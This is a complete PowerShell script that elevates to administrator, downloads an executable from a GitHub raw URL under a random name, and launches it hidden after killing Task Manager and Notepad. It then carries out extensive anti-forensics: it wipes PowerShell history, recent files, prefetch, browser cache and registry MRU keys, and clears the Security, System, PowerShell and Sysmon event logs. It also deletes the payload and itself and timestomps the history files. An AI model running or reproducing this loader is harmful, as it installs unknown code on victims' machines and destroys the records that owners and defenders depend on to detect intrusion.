# === Self-Elevate ===
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        Start-Process powershell.exe -Verb RunAs -ArgumentList (
            "-NoProfile",
            "-ExecutionPolicy Bypass",
            "-File `"$PSCommandPath`""
        )
        exit
    }
    catch {
        Write-Host "Failed to request Admin privileges: $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
}

# === Add Win32 API for hiding windows (ShowWindow) ===
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Win32Window {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
}
"@

# === 1. Clear Temp Folder ===
Write-Host "[+] Clearing %TEMP% folder..." -ForegroundColor Cyan
$tempDir = $env:TEMP
try {
    Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Temp cleared." -ForegroundColor Green
}
catch {
    Write-Host "[!] Warning: Could not fully clear temp (files might be in use). Continuing..." -ForegroundColor Yellow
}

# === 2. Download EXE to %TEMP% with Random Name ===
$randomGuid = [System.Guid]::NewGuid().ToString()
$exeFileName = "$randomGuid.exe"
$exePath = Join-Path $env:TEMP $exeFileName

# 👇 UPDATED: Download from the GitHub raw URL
$exeUrl = "https://raw.githubusercontent.com/TSTEAM865/fafawfqf/main/cmd.exe"

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($exeUrl, $exePath)
    $webClient.Dispose()
    
    if (Test-Path $exePath) {
        Write-Host "[+] Download successful." -ForegroundColor Green
    } else {
        throw "File not found after download."
    }
}
catch {
    Write-Host "[!] Failed to download EXE: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# === 3. Pre-Cleanup: Kill existing target processes (optional) ===
Write-Host "[+] Killing existing taskmgr and notepad processes to prevent conflicts..." -ForegroundColor Cyan
foreach ($pName in @("taskmgr", "notepad")) {
    $procs = Get-Process -Name $pName -ErrorAction SilentlyContinue
    if ($procs) {
        foreach ($p in $procs) {
            try {
                Stop-Process -Id $p.Id -Force -ErrorAction Stop
                Write-Host "[+] Killed $pName (PID: $($p.Id))" -ForegroundColor Green
            } catch {
                Write-Host "[!] Failed to kill $pName (PID: $($p.Id)): $($_.Exception.Message)" -ForegroundColor Yellow
            }
        }
    }
}
Start-Sleep -Seconds 1

# === 4. Launch the downloaded EXE ===
Write-Host "[+] Launching the downloaded EXE..." -ForegroundColor Yellow

$proc = Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue

if (-not $proc) {
    Write-Host "[!] Failed to start the EXE. Trying without hiding..." -ForegroundColor Yellow
    $proc = Start-Process -FilePath $exePath -PassThru -ErrorAction SilentlyContinue
}

if ($proc) {
    Write-Host "[+] EXE launched (PID: $($proc.Id))." -ForegroundColor Green
} else {
    Write-Host "[!] Could not launch the EXE." -ForegroundColor Red
    exit 1
}

# === 5. Enhanced Cleanup & Anti-Forensics ===
Write-Host "[+] Starting deep cleanup..." -ForegroundColor Cyan

# 1. Clear PowerShell History (Memory & File Content)
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
$histPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $histPath) { 
    try { Set-Content -Path $histPath -Value "" -Force -ErrorAction SilentlyContinue } catch {}
}

# 2. Clear Recent Files
$recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
if (Test-Path $recentPath) {
    Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
}

# 3. Clear Jump Lists
$jumpListPaths = @(
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"),
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations")
)
foreach ($path in $jumpListPaths) {
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

# 4. Clear Prefetch (Multiple Attempts to Catch Re-created Files)
$prefetchPath = "C:\Windows\Prefetch"
for ($i = 0; $i -lt 3; $i++) {
    Start-Sleep -Seconds 1
    if (Test-Path $prefetchPath) {
        Get-ChildItem -Path $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

# 5. Clear INetCache (IE/Edge Cache)
$ieCache = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache"
if (Test-Path $ieCache) {
    Get-ChildItem -Path $ieCache -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
}

# 6. Clear Temp Folder Again (in case anything was recreated)
$tempDir = $env:TEMP
Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue

# 7. Clear Registry MRU Keys (User-specific)
$mruKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
    "HKCU:\Software\Microsoft\Windows\ShellNoRoam\BagMRU",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
)
foreach ($key in $mruKeys) {
    if (Test-Path $key) {
        Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
        New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null
    }
}

# 8. Clear Event Logs (Requires Admin)
$logNames = @("Application", "Security", "System", "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-Sysmon/Operational")
foreach ($logName in $logNames) {
    try {
        wevtutil cl $logName 2>$null
    } catch {
        # Ignore errors if log doesn't exist or access denied
    }
}

# 9. Delete the downloaded EXE from Temp
Start-Sleep -Seconds 2
if (Test-Path $exePath) { 
    try { Remove-Item $exePath -Force -ErrorAction SilentlyContinue } catch {}
}

# 10. Delete the script itself
if ($PSCommandPath -and (Test-Path $PSCommandPath)) { 
    Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue 
}

# 11. Force GC and wait a bit to let system settle
[GC]::Collect()
Start-Sleep -Seconds 2

# === 12. Timestomp PowerShell History and Folders ===
Write-Host "[+] Timestomping PowerShell history and related folders..." -ForegroundColor Cyan
$timestompCmd = @'
$inst = (Get-Item C:\Windows).CreationTime
$diff = ((Get-Date) - $inst).TotalDays
if ($diff -lt 0) { $diff = 0 }
if ($diff -lt 7) { 
    $targetDate = $inst.Date.AddHours((Get-Random -Min 12 -Max 23)).AddMinutes((Get-Random -Min 0 -Max 60)) 
} else { 
    $max = [Math]::Min(15, [Math]::Floor($diff))
    $targetDate = (Get-Date).AddDays(-(Get-Random -Min 7 -Max ($max + 1))).AddHours(-(Get-Random -Min 0 -Max 24)).AddMinutes(-(Get-Random -Min 0 -Max 60)) 
}
$h = (Get-PSReadLineOption).HistorySavePath
(Get-Content $h) | Where-Object { $_ -notmatch 'LastWriteTime|CreationTime' } | Set-Content $h
(Get-Item $h).LastWriteTime = $targetDate
$f1 = Split-Path $h -Parent
try { (Get-Item $f1).LastWriteTime = $targetDate } catch {}
try { (Get-Item (Split-Path $f1 -Parent)).LastWriteTime = $targetDate } catch {}
'@
powershell -NoProfile -Command $timestompCmd

exit
